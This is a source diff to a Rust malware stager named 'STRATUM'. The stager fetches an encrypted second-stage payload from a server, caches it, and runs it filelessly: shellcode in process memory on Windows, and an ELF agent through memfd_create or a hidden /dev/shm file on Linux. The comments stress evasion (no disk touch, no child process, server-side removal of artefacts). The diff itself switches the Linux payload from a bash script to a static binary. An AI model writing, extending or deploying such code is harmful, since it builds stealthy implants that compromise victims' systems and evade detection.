@@ -8,20 +8,18 @@
 //!   4. Cache hw-encrypted copy to BLOB_PATH for offline resilience.
 //!   5. Windows: execute stage2 shellcode blob in-process via VirtualAlloc+CreateThread
 //!               (no file on disk, no LoadLibraryA, no child process).
-//!      Linux:   exec stage2 bash script via memfd/shm (no disk touch).
+//!      Linux:   exec stage2 ELF binary via memfd_create (no disk touch).
 //!   6. Server cancels S2_PATH at first heartbeat (no cloud artefact after first run).
 //!
 //! Stage2 format per platform:
 //!   Windows — raw x64 PIC shellcode blob (stub.bin); no MZ header.
 //!             The blob is a self-contained reflective loader that maps the
 //!             full agent EXE embedded in its .rodata section.
-//!   Linux   — bash script prefixed with "STRATUM:" after decrypt.
+//!   Linux   — musl-static ELF binary (full Rust agent).
 
 use crate::transport;
 use crate::crypto_compat;
 use crate::hw;
-#[cfg(not(windows))]
-use crate::s;
 
 const STUB_SECRET:  &str = env!("STRATUM_STUB_SECRET");
 const SALT:         &str = env!("STRATUM_SALT");
@@ -70,7 +68,7 @@ enum Payload {
     #[cfg(windows)]
     Shellcode(Vec<u8>),
     #[cfg(not(windows))]
-    Script(String),
+    Elf(Vec<u8>),
 }
 
 // ── fetch + decrypt ───────────────────────────────────────────────────────────
@@ -86,9 +84,9 @@ fn fetch_cloud(t: &transport::SharedTransport) -> Option<Payload> {
 }
 
 fn decode_from_b64(bk: &str, s2_b64: &str) -> Option<Payload> {
+    let plain = crypto_compat::stratum_decrypt_bytes(bk, s2_b64)?;
     #[cfg(windows)]
     {
-        let plain = crypto_compat::stratum_decrypt_bytes(bk, s2_b64)?;
         if plain.len() < 64 {
             if cfg!(stratum_debug) { eprintln!("[staged-enc] shellcode blob too small"); }
             return None;
@@ -97,11 +95,11 @@ fn decode_from_b64(bk: &str, s2_b64: &str) -> Option<Payload> {
     }
     #[cfg(not(windows))]
     {
-        // Linux stage2 = bash script; decrypt to String, strip STRATUM: prefix.
-        let plain  = crypto_compat::openssl_decrypt(bk, s2_b64)?;
-        let prefix = s!("STRATUM:");
-        let script = plain.strip_prefix(prefix.as_str())?.to_string();
-        return Some(Payload::Script(script));
+        if plain.len() < 4 {
+            if cfg!(stratum_debug) { eprintln!("[staged-enc] ELF binary too small"); }
+            return None;
+        }
+        return Some(Payload::Elf(plain));
     }
 }
 
@@ -112,7 +110,7 @@ fn cache_payload(payload: &Payload) {
         #[cfg(windows)]
         Payload::Shellcode(b) => b.clone(),
         #[cfg(not(windows))]
-        Payload::Script(s) => format!("{}{}", s!("STRATUM:"), s).into_bytes(),
+        Payload::Elf(b) => b.clone(),
     };
     hw::write_blob(BLOB_PATH, &raw, SALT);
     let expanded = hw::expand(BLOB_PATH);
@@ -128,9 +126,9 @@ fn cache_payload(payload: &Payload) {
 
 fn load_blob() -> Option<Payload> {
     if cfg!(stratum_debug) { eprintln!("[staged-enc] reading blob: {}", BLOB_PATH); }
+    let bytes = hw::read_blob_bytes(BLOB_PATH, SALT)?;
     #[cfg(windows)]
     {
-        let bytes = hw::read_blob_bytes(BLOB_PATH, SALT)?;
         if bytes.len() < 64 {
             if cfg!(stratum_debug) { eprintln!("[staged-enc] blob: shellcode too small"); }
             return None;
@@ -139,10 +137,11 @@ fn load_blob() -> Option<Payload> {
     }
     #[cfg(not(windows))]
     {
-        let plain  = hw::read_blob(BLOB_PATH, SALT)?;
-        let prefix = s!("STRATUM:");
-        let script = plain.strip_prefix(prefix.as_str())?.to_string();
-        return Some(Payload::Script(script));
+        if bytes.len() < 4 {
+            if cfg!(stratum_debug) { eprintln!("[staged-enc] blob: ELF too small"); }
+            return None;
+        }
+        return Some(Payload::Elf(bytes));
     }
 }
 
@@ -153,7 +152,7 @@ fn exec_payload(payload: Payload) {
         #[cfg(windows)]
         Payload::Shellcode(sc_bytes) => exec_windows_shellcode(sc_bytes),
         #[cfg(not(windows))]
-        Payload::Script(script) => exec_unix(&script),
+        Payload::Elf(elf_bytes) => exec_unix_elf(&elf_bytes),
     }
 }
 
@@ -192,11 +191,11 @@ fn exec_windows_shellcode(sc_bytes: Vec<u8>) {
 }
 
 #[cfg(unix)]
-fn exec_unix(script: &str) {
+fn exec_unix_elf(elf_bytes: &[u8]) {
     use std::os::unix::process::CommandExt;
-    use rand::RngCore;
 
     // 1. memfd_create: anonymous in-memory fd — no filesystem path, no disk touch.
+    //    Write ELF to memfd, then fexecve via /proc/self/fd/N.
     #[cfg(target_os = "linux")]
     {
         use std::io::Write;
@@ -207,18 +206,17 @@ fn exec_unix(script: &str) {
         };
         if fd >= 0 {
             let mut f = unsafe { std::fs::File::from_raw_fd(fd) };
-            if f.write_all(script.as_bytes()).is_ok() {
-                // Leak the File so the fd stays open across exec — bash needs
-                // /proc/self/fd/N to remain valid until it reads the script.
+            if f.write_all(elf_bytes).is_ok() {
                 let fd_live = f.into_raw_fd();
                 let fd_path = format!("/proc/self/fd/{}", fd_live);
-                let _ = std::process::Command::new("/bin/bash").arg(&fd_path).exec();
-                let _ = std::process::Command::new("/bin/sh").arg(&fd_path).exec();
+                if cfg!(stratum_debug) { eprintln!("[staged-enc] exec ELF via memfd: {}", fd_path); }
+                let _ = std::process::Command::new(&fd_path).exec();
             }
         }
     }
 
-    // 2. /dev/shm (RAM-backed tmpfs) — no physical disk I/O
+    // 2. /dev/shm fallback (RAM-backed tmpfs) — no physical disk I/O
+    use rand::RngCore;
     let tmp_dir = if std::path::Path::new("/dev/shm").is_dir() {
         std::path::PathBuf::from("/dev/shm")
     } else {
@@ -226,11 +224,11 @@ fn exec_unix(script: &str) {
     };
 
     let tmp_path = tmp_dir.join(format!(".{:016x}", rand::thread_rng().next_u64()));
-    if std::fs::write(&tmp_path, script.as_bytes()).is_ok() {
+    if std::fs::write(&tmp_path, elf_bytes).is_ok() {
         use std::os::unix::fs::PermissionsExt;
         let _ = std::fs::set_permissions(&tmp_path, std::fs::Permissions::from_mode(0o700));
-        let _ = std::process::Command::new("/bin/bash").arg(&tmp_path).exec();
+        if cfg!(stratum_debug) { eprintln!("[staged-enc] exec ELF via shm: {:?}", tmp_path); }
+        let _ = std::process::Command::new(&tmp_path).exec();
         let _ = std::fs::remove_file(&tmp_path);
     }
-    let _ = std::process::Command::new("/bin/sh").arg("-c").arg(script).exec();
 }
